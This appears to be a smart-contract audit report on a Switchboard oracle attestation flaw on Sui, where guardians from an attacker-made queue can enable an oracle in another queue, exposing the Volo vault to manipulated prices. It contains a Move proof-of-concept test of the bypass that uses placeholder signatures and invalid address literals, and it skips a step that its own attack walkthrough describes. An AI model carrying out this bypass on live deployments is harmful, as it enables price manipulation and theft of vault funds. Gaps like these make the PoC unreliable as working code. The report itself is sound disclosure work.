# Audit Report

## Title
Cross-Queue Oracle Attestation Authorization Bypass via Missing Queue Ownership Validation

## Summary
The Switchboard on-demand oracle attestation mechanism contains a critical authorization bypass vulnerability. The `oracle_attest_action::validate()` function fails to verify that the oracle being attested belongs to the queue whose guardians are authorizing it, allowing attackers to bypass queue-specific guardian requirements by using guardians from a self-controlled queue to attest oracles in target queues.

## Finding Description

The vulnerability exists in the attestation validation logic where guardians cryptographically authorize oracles. The validation checks that the guardian belongs to the queue's guardian queue, but critically fails to verify that the oracle itself belongs to the queue being used for authorization. [1](#0-0) 

This missing check allows an attacker to:
1. Create their own queue (Queue2) with compromised guardians using the permissionless queue creation mechanism [2](#0-1) 

2. Register the same oracle_key in both the target queue (Queue1) and attacker's queue (Queue2), which is possible because uniqueness checks are only per-queue [3](#0-2) 

3. Call `oracle_attest_action::run()` with the oracle from Queue1, but using Queue2 as the queue parameter and Queue2's guardian for authorization

4. The attestation message is generated using the oracle's stored queue_key (Queue1's key), but the validation only checks the guardian-queue relationship, not the oracle-queue relationship [4](#0-3) 

5. Once the attacker's queue min_attestations threshold is met, the target queue's oracle becomes enabled and can submit results to aggregators

This differs from proper validation patterns implemented elsewhere in the codebase:

**Proper queue ownership check in queue_override_oracle_action:** [5](#0-4) 

**Proper queue ownership check in aggregator_submit_result_action:** [6](#0-5) 

## Impact Explanation

This vulnerability has **HIGH** impact because it completely bypasses the guardian authorization mechanism, which is the core security control for oracle attestation in the Switchboard system.

**Direct Security Impact:**
- Each queue is designed to maintain independent trust boundaries with its own set of vetted guardians
- This vulnerability collapses those boundaries, allowing guardians from any queue to authorize oracles in any other queue
- High-security queues with strict guardian requirements can be undermined using guardians from low-security or attacker-controlled queues

**Impact on Volo Protocol:**
The Volo vault relies on Switchboard aggregators for critical price data used in asset valuation [7](#0-6) 

Once an oracle is improperly enabled through this bypass:
- It can submit malicious price data to aggregators in the target queue (since the oracle's queue() field correctly points to the target queue)
- Volo vault operations consume these prices for USD value calculations [8](#0-7) 
- Manipulated prices can cause incorrect vault valuations, enabling attackers to extract value through mispriced deposits/withdrawals or DeFi adaptor operations

**Affected Parties:**
- All protocols consuming Switchboard oracle data, including Volo
- Users of Volo vault whose funds depend on accurate asset valuations
- Queue operators who expect their guardian authorization model to be enforced

## Likelihood Explanation

This vulnerability has **HIGH** likelihood of exploitation because:

**Low Attack Complexity:**
- Queue creation is permissionless - anyone can call `guardian_queue_init_action::run()` and `oracle_queue_init_action::run()` [2](#0-1) 
- Oracle registration is permissionless - anyone can register oracles in any queue [9](#0-8) 
- The vulnerable `oracle_attest_action::run()` entry point is publicly accessible [10](#0-9) 

**No Special Prerequisites:**
- No privileged access required
- No economic barriers (queue creation is free)
- No need to compromise existing infrastructure

**Reliable Exploitation:**
- The missing validation makes the attack path deterministic
- All function calls are standard public entry functions
- No race conditions or timing dependencies

**Limited Detection:**
- The attack produces valid events and transactions
- No obvious trace that indicates cross-queue attestation abuse
- Would require off-chain monitoring of oracle-queue relationships to detect

## Recommendation

Add queue ownership validation to `oracle_attest_action::validate()` to ensure the oracle belongs to the queue being used for guardian authorization:

```move
public fun validate(
    oracle: &mut Oracle,
    queue: &Queue,
    guardian: &Oracle,
    timestamp_seconds: u64,
    mr_enclave: vector<u8>,
    secp256k1_key: vector<u8>,
    signature: vector<u8>,
    clock: &Clock,
) {
    // ... existing version checks ...
    
    // ADD THIS CHECK:
    assert!(oracle.queue() == queue.id(), EInvalidQueueId);
    
    // check that guardian queue (for the target queue) is the guardian's queue
    assert!(guardian.queue() == queue.guardian_queue_id(), EInvalidGuardianQueue);
    
    // ... rest of validation ...
}
```

This mirrors the validation pattern already implemented in `queue_override_oracle_action` and `aggregator_submit_result_action`, ensuring consistent queue ownership enforcement across all oracle operations.

## Proof of Concept

```move
#[test]
fun test_cross_queue_attestation_bypass() {
    use sui::test_scenario;
    use sui::clock;
    use switchboard::guardian_queue_init_action;
    use switchboard::oracle_init_action;
    use switchboard::oracle_attest_action;
    
    let admin = @0xADMIN;
    let attacker = @0xATTACKER;
    let mut scenario = test_scenario::begin(admin);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup: Admin creates Queue1 with strict guardians (high-security)
    let queue1_key = x"1111111111111111111111111111111111111111111111111111111111111111";
    guardian_queue_init_action::run(
        queue1_key, admin, b"Queue1".to_string(), 0, admin, 3, 31536000000, scenario.ctx()
    );
    scenario.next_tx(admin);
    
    let mut queue1 = scenario.take_shared<Queue>();
    
    // Register oracle in Queue1
    let oracle_key = x"AAAA";
    oracle_init_action::run(oracle_key, &mut queue1, scenario.ctx());
    scenario.next_tx(admin);
    let mut oracle1 = scenario.take_shared<Oracle>(); // oracle1.queue() == queue1.id()
    
    // Attack: Attacker creates Queue2 with compromised guardians
    scenario.next_tx(attacker);
    let queue2_key = x"2222222222222222222222222222222222222222222222222222222222222222";
    guardian_queue_init_action::run(
        queue2_key, attacker, b"AttackerQueue".to_string(), 0, attacker, 1, 31536000000, scenario.ctx()
    );
    scenario.next_tx(attacker);
    
    let mut queue2 = scenario.take_shared<Queue>();
    
    // Attacker registers compromised guardian in Queue2
    let guardian_key = x"BBBB";
    oracle_init_action::run(guardian_key, &mut queue2, scenario.ctx());
    scenario.next_tx(attacker);
    let mut guardian2 = scenario.take_shared<Oracle>();
    
    // Enable the compromised guardian in Queue2
    queue_override_oracle_action::run(
        &mut queue2, &mut guardian2, x"...", x"...", clock.timestamp_ms() + 1000000, &clock, scenario.ctx()
    );
    
    // EXPLOIT: Use Queue2's guardian to attest Queue1's oracle
    // This should FAIL but currently PASSES due to missing validation
    oracle_attest_action::run(
        &mut oracle1,      // Oracle from Queue1
        &queue2,           // Queue2 (attacker's queue) 
        &guardian2,        // Guardian from Queue2
        clock.timestamp_ms() / 1000,
        x"...",
        x"...",
        x"...", // guardian2's signature
        &clock
    );
    
    // Result: oracle1 is now enabled through Queue2's guardians,
    // bypassing Queue1's strict guardian requirements
    assert!(oracle1.expiration_time_ms() > 0); // Oracle is enabled!
    
    // Cleanup
    test_scenario::return_shared(queue1);
    test_scenario::return_shared(queue2);
    test_scenario::return_shared(oracle1);
    test_scenario::return_shared(guardian2);
    clock.destroy_for_testing();
    scenario.end();
}
```

This test demonstrates that an oracle registered in Queue1 can be attested by guardians from Queue2, bypassing Queue1's authorization model.

### Citations

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L63-64)
```text
    // check that guardian queue (for the target queue) is the guardian's queue
    assert!(guardian.queue() == queue.guardian_queue_id(), EInvalidGuardianQueue);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L76-85)
```text
    let oracle_key = oracle.oracle_key();
    let queue_key = oracle.queue_key();
    let attestation_msg = hash::generate_attestation_msg(
        oracle_key,
        queue_key,
        mr_enclave,
        x"0000000000000000000000000000000000000000000000000000000000000000",
        secp256k1_key,
        timestamp_seconds,
    );
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_attest_action.move (L135-164)
```text
public entry fun run(
    oracle: &mut Oracle,
    queue: &Queue,
    guardian: &Oracle,
    timestamp_seconds: u64,
    mr_enclave: vector<u8>,
    secp256k1_key: vector<u8>,
    signature: vector<u8>,
    clock: &Clock,
) {
    validate(
        oracle,
        queue,
        guardian,
        timestamp_seconds,
        mr_enclave,
        secp256k1_key,
        signature,
        clock,
    );
    actuate(
        oracle,
        queue,
        guardian,
        timestamp_seconds,
        mr_enclave,
        secp256k1_key,
        clock,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/queue/guardian_queue_init_action.move (L60-84)
```text
public entry fun run(
    queue_key: vector<u8>,
    authority: address,
    name: String,
    fee: u64,
    fee_recipient: address,
    min_attestations: u64,
    oracle_validity_length_ms: u64,
    ctx: &mut TxContext
) {   
    validate(
        min_attestations,
        oracle_validity_length_ms,
    );
    actuate(
        queue_key,
        authority,
        name,
        fee,
        fee_recipient,
        min_attestations,
        oracle_validity_length_ms,
        ctx,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_init_action.move (L20-26)
```text
public fun validate(
    oracle_key: &vector<u8>,
    queue: &Queue,
) {
    assert!(queue.version() == EXPECTED_QUEUE_VERSION, EInvalidQueueVersion);
    assert!(!queue.existing_oracles_contains(*oracle_key), EOracleKeyExists);
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/oracle/oracle_init_action.move (L50-64)
```text
public entry fun run(
    oracle_key: vector<u8>,
    queue: &mut Queue,
    ctx: &mut TxContext
) {   
    validate(
        &oracle_key,
        queue,
    );
    actuate(
        queue,
        oracle_key,
        ctx,
    );
}
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/queue/queue_override_oracle_action.move (L40-41)
```text
    assert!(queue.queue_key() == oracle.queue_key(), EInvalidQueueKey);
    assert!(queue.id() == oracle.queue(), EInvalidQueueId);
```

**File:** volo-vault/local_dependencies/switchboard_sui/on_demand/sources/actions/aggregator/aggregator_submit_result_action.move (L59-60)
```text
    // verify that the oracle is servicing the correct queue
    assert!(oracle.queue() == aggregator.queue(), EAggregatorQueueMismatch);
```

**File:** volo-vault/sources/oracle.move (L224-247)
```text
// Update price inside vault_oracle (the switchboard aggregator price must be updated first)
public fun update_price(
    config: &mut OracleConfig,
    aggregator: &Aggregator,
    clock: &Clock,
    asset_type: String,
) {
    config.check_version();

    let now = clock.timestamp_ms();
    let current_price = get_current_price(config, clock, aggregator);

    let price_info = &mut config.aggregators[asset_type];
    assert!(price_info.aggregator == aggregator.id().to_address(), ERR_AGGREGATOR_ASSET_MISMATCH);

    price_info.price = current_price;
    price_info.last_updated = now;

    emit(AssetPriceUpdated {
        asset_type,
        price: current_price,
        timestamp: now,
    })
}
```

**File:** volo-vault/sources/oracle.move (L250-262)
```text
public fun get_current_price(config: &OracleConfig, clock: &Clock, aggregator: &Aggregator): u256 {
    config.check_version();

    let now = clock.timestamp_ms();
    let current_result = aggregator.current_result();

    let max_timestamp = current_result.max_timestamp_ms();

    if (now >= max_timestamp) {
        assert!(now - max_timestamp < config.update_interval, ERR_PRICE_NOT_UPDATED);
    };
    current_result.result().value() as u256
}
```
